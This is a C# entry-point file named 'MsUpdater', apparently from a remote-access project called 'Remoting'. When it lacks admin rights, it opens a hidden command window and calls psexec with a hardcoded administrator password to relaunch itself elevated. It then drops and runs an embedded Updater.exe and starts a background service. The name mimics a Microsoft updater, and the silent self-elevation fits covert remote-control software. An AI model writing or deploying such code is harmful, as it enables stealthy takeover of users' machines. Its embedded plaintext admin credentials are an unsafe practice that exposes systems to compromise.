namespace MsUpdater
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Net;
    using System.Reflection;
    using System.Runtime.CompilerServices;
    using System.Security.Principal;

    internal static class Program
    {
        public const string Version = "1.0.0.1";

        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                var location = Assembly.GetExecutingAssembly().Location;

                Process.Start(new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = $"/C ping 127.0.0.1 -n 2 && cd \"{Path.GetDirectoryName(location)}\" & psexec -u administrator -p abc123kappa -c \"{location}\" & exit",
                            WindowStyle = ProcessWindowStyle.Hidden
                        });

                return;
            }

            var updater = Path.Combine(Directory.GetCurrentDirectory(), "Updater.exe");

            if (File.Exists(updater))
            {
                File.Delete(updater);
            }
            
            string webVersion;

            using (var client = new WebClient())
            {
                webVersion = client.DownloadString("https://raw.githubusercontent.com/Wiciaki/Remoting/master/Downloads/Version.txt");
            }

            if (typeof(Program).Assembly.GetName().Version < new Version(webVersion))
            {
                File.WriteAllBytes(updater, Properties.Resources.Updater);
                Process.Start(updater);
                return;
            }

            RuntimeHelpers.RunClassConstructor(typeof(Service).TypeHandle);
        }
    }
}